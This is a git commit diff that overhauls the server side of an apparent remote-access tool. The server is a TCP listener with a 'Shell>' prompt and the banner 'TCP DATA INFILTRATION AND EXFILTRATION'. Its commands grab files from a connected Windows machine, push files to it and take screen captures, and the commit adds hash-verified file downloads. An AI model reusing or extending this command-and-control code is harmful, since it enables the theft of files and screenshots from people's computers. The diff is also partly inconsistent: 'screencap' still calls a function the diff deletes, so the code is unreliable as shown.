0308bf8e64a2066af5da2ed282f31faf175d9fe0
segfaultingWizard <132017954+segfaultingWizard@users.noreply.github.com>
2026-03-11 15:34:34 -0500

    feat!: Overhauled server receive function
    BREAKING CHANGE:
    Handle new errors, handle file hash, align to chunksize, etc.

--- send_server.py
+++ send_server.py
@@ -5,35 +5,65 @@
 
 import os
 import socket
+import hashlib
 
 ip = "0.0.0.0"
 port = 8080
 chunksize = 1024
+destinationPath = os.path.join(os.path.expanduser('~'), 'GrabbedFiles')
+hashAlgorithm = 'sha256'
 
-def transfer(mySocket, command, operation):
-    mySocket.send(command.encode())
+# https://sqlpey.com/python/top-8-methods-to-hash-files-in-python/
+def getFileHash(filePath):
+    fileHash = hashlib.new(hashAlgorithm)
+    with open(filePath, 'rb') as file:
+        while chunk := file.read(fileHash.block_size):
+            fileHash.update(chunk)
+    return fileHash.hexdigest()
 
-    # grab*C:\Users\user\Desktop\file.txt
-    if (operation == "grab"):
-        grab, path = command.split("*")
-        f=open('/root/Desktop/'+path, 'wb')
+def receiveFile(mySocket, path):
+    try:
+        os.mkdir(destinationPath)
+        print('Created destination folder')
+    except FileExistsError:
+        print('Destination folder exists')
 
-    if(operation == "screenCap"):
-        fileName = "screenCapture.jpg"
-        f=open('/root/Desktop/'+fileName, 'wb')
+    fileName = os.path.basename(path)
+    destinationFile = os.path.join(destinationPath, fileName)
+    print('Remote File Path =', path)
+    print('Remote File Name =', fileName)
+    print('Destination =', destinationFile)
 
-    while True:
-        bits = mySocket.recv(chunksize)
-        if bits.endswith('DONE'.encode()):
-            f.write(bits[:-4]) # Write those last received bits without the word 'DONE'
-            f.close()
-            print ('[+] Transfer completed')
-            break
-        if 'File not found'.encode() in bits:
-            f.close()  # not in directions
-            print ('[-] Unable to find out the file')
-            break
-        f.write(bits)
+    print('[+] Downloading file...')
+    with open(destinationFile, 'wb') as file:
+        # walrus operator to loop for as many packets
+        while packet := mySocket.recv(chunksize):
+            #print(packet)
+            if packet.endswith('DONE'.encode()):
+                file.write(packet[:-4])  # Write the last received packet without the word 'DONE'
+                file.flush()
+                print('[+] Transfer completed!')
+
+                print('[+] Calculating file hash...')
+                mySocket.send('READY'.encode())
+                remoteFileHash = mySocket.recv(chunksize).decode()
+                localFileHash = getFileHash(destinationFile)
+                if remoteFileHash == localFileHash:
+                    print('[+] File hashes match!')
+                    print('[+] Success!')
+                else:
+                    print('[-] Warning! File hashes do not match')
+                    print('[-] Remote File Hash:', remoteFileHash)
+                    print('[-] Local File Hash:', localFileHash)
+                break
+            elif 'File not found'.encode() in packet:
+                print ('[-] File not found')
+                break
+            elif 'ERROR'.encode() in packet:
+                error = packet.decode().split('ERROR')[1:]
+                print(error)
+                break
+            file.write(packet)
 
 def doSend(mySocket, sourcePath, destinationPath, fileName):
     # For 'send' operation, open the file in the read mode
@@ -60,30 +90,33 @@ def connect():
     print("TCP DATA INFILTRATION AND EXFILTRATION")
     print("=" * 60)
     print('[+] Listening for incoming TCP mySocketection on port', port)
-    mySocket, clientAddress = mySocket.accept()
+    mySocket, clientAddress = initSocket.accept()
     print('[+] We got a mySocketection from', clientAddress)
 
     while True:
         print("=" * 60)
         command = input("Shell> ")
-        if 'terminate' in command:
+        commandList = command.split()
+
+        if 'terminate' == commandList[0]:
             mySocket.send('terminate'.encode())
             break
 
-        #command format: grab*<File Path>
-        #example: grab*C:\Users\John\Desktop\photo.jpeg
-        elif 'grab' in command:
-            transfer(mySocket, command, "grab")
+        # Command format: grab <File Path>
+        # Example: grab C:\Users\user\Desktop\file.txt
+        elif 'grab' == commandList[0]:
+            mySocket.send(command.encode())
+            receiveFile(mySocket, path=' '.join(commandList[1:]))
 
         #command format: send*<destination path>*<File Name>
         #example: send*C:\Users\John\Desktop\*photo.jpeg
         #source file in Linux. Example: /root/Desktop
-        elif 'send' in command:
+        elif 'send' in commandList[0]:
             sendCmd, destination, fileName = command.split("*")
             source = input("Source path: ")
             mySocket.send(command.encode())
             doSend(mySocket, source, destination, fileName)
-        elif 'screencap' in command:
+        elif 'screencap' in commandList[0]:
             transfer(mySocket, command, "screenCap")
 
         else:
